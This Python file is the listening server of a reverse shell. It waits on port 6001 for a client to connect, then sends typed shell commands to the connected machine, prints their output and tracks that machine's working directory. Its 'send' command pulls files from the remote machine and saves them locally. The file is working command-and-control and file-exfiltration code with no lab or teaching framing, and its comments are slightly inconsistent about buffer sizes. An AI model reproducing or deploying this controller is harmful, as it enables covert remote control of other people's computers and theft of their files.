import socket
import os
import tqdm

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 6001
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages
# receive 4096 bytes each time
FILE_BUFFER_SIZE = 4096
#Separator string for sending 2 messages in one go

SEPARATOR = "<sep>"

# create a socket object
s = socket.socket()

s.bind((SERVER_HOST, SERVER_PORT))

s.listen(5)

print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")

# accept any connections attempted
client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")

# receiving the current working directory of the client

cwd = client_socket.recv(BUFFER_SIZE).decode()

print("#[+] Current working directory:", cwd)

def recFile(filename, filesize):
    # start receiving the file from the socket
    # and writing to the file stream
    progress = tqdm.tqdm(range(filesize), f"Receiving {filename}", unit="B", unit_scale=True, unit_divisor=1024)
    with open(filename, "wb") as f:
        while True:
            # read 1024 bytes from the socket (receive)
            bytes_read = client_socket.recv(BUFFER_SIZE)
            if not bytes_read:    
                # nothing is received
                # file transmitting is done
                break
            # write to the file the bytes we just received
            f.write(bytes_read)
            # update the progress bar
            progress.update(len(bytes_read))

while True:
    # get the command from prompt
    command = input(f"{cwd} $> ")
    if not command.strip():
        # empty command
        continue
    # send the command to the client
    client_socket.send(command.encode())
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        client_socket.close()
        s.close()
        break
    # retrieve command results
    output = client_socket.recv(BUFFER_SIZE).decode()
    split_cmd = command.split()
    if split_cmd[0] == "send":
        filename, filesize = output.split(SEPARATOR)

        filename = os.path.basename(filename)
        # convert to integer
        filesize = int(filesize)
        recFile(filename, filesize)
        
    else:
    # split command output and current directory
        results, cwd = output.split(SEPARATOR)
    # print output
        print(results)

